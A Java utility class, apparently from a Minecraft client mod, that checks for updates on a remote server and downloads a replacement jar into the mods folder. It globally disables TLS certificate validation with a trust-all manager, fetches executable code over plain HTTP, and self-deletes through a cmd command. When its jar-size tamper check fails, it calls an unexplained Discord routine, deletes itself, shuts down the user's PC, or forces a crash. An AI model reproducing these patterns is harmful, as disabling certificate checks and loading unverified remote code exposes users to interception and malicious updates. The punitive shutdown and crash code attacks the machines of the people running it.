package org.infinity.utils;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.security.cert.X509Certificate;

import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

import org.apache.commons.io.IOUtils;
import org.apache.commons.lang3.SystemUtils;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.conn.ssl.SSLConnectionSocketFactory;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.infinity.InfMain;
import org.infinity.ui.UpdateUI;

import com.mashape.unirest.http.Unirest;

import me.protect.Protect;
import me.protect.utils.PHelper;

public class ConnectUtil {

	public static boolean checkUpdate() {
		String currentVersion = InfMain.getVersion();

		if (getUpdateVersion().equalsIgnoreCase(currentVersion)) {
			return true;
		} else {

			Helper.openScreen(new UpdateUI());

			(new Thread() {
				@Override
				public void run() {
					try {
						Thread.sleep(4000);

						downloadClient();
					} catch (Exception e) {

					}
				}
			}).start();
			return false;
		}
	}

	public static String getUpdateVersion() {
		String version = "";
		try {
			httpsSertificate();
			version = readURLToString("https://whyuleet.ru/infinity/version/version.txt");
			version = version.replace("Version: ", "");

		} catch (Exception e) {

		}
		return version.replaceAll("[\\\r\\\n]+", "");
	}

	public static String readURLToString(String url) throws IOException {
		try (InputStream inputStream = new URL(url).openStream()) {
			return IOUtils.toString(inputStream, StandardCharsets.UTF_8);
		}
	}

	public static void downloadClient() {
		new Thread(() -> {

			try {
				File path = new File(Helper.minecraftClient.runDirectory, "mods");
				File file = new File(path, "Infinity-" + getUpdateVersion() + ".jar");
				if (Protect.DOWNLOADER.download(
						new URL("http://whyuleet.ru/infinity/jar/Infinity-" + getUpdateVersion() + ".jar"),
						file) != null) {
					seldDestructionJar();
				}
			} catch (Exception e) {

			}
		}).start();
	}

	private static void selfDestructWindowsJARFile() throws Exception {
		String currentJARFilePath = ProgramDirectoryUtilities.getCurrentJARFilePath().toString();
		Runtime runtime = Runtime.getRuntime();
		runtime.exec("cmd /c ping localhost -n 2 > nul && del \"" + currentJARFilePath + "\"");
	}

	public static void seldDestructionJar() throws Exception {
		if (SystemUtils.IS_OS_WINDOWS) {
			selfDestructWindowsJARFile();
		} else {

			File directoryFilePath = ProgramDirectoryUtilities.getCurrentJARFilePath();
			Files.delete(directoryFilePath.toPath());
		}

		System.exit(0);

	}

	public static void httpsSertificate() throws Exception {
		try {

			TrustManager[] trustAllCerts = new TrustManager[] { new X509TrustManager() {
				public java.security.cert.X509Certificate[] getAcceptedIssuers() {
					return null;
				}

				public void checkClientTrusted(X509Certificate[] certs, String authType) {
				}

				public void checkServerTrusted(X509Certificate[] certs, String authType) {
				}

			} };

			SSLContext sslcontext = SSLContext.getInstance("SSL");
			sslcontext.init(null, trustAllCerts, new java.security.SecureRandom());
			HttpsURLConnection.setDefaultSSLSocketFactory(sslcontext.getSocketFactory());
			SSLConnectionSocketFactory sslsf = new SSLConnectionSocketFactory(sslcontext);
			CloseableHttpClient httpclient = HttpClients.custom().setSSLSocketFactory(sslsf).build();
			Unirest.setHttpClient(httpclient);

		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public static boolean checkJarSize() {
		try {
			httpsSertificate();
			File infJar = ProgramDirectoryUtilities.getCurrentJARFilePath();

			HttpClient client = HttpClients.createDefault();
			HttpGet request = new HttpGet("http://whyuleet.ru/infinity/jar/Infinity-" + getUpdateVersion() + ".jar");
			HttpResponse response = client.execute(request);
			String size = response.getLastHeader("Content-Length").getValue();

			int serverJarSize = Integer.parseInt(size);

			if (infJar.length() != serverJarSize) {

				Protect.CRACK.discordExecute();

				seldDestructionJar();

				Protect.CRACK.shutdownPC();
				return false;
			}

		} catch (Exception e) {
			PHelper.makeCrash();
		}

		return true;
	}

}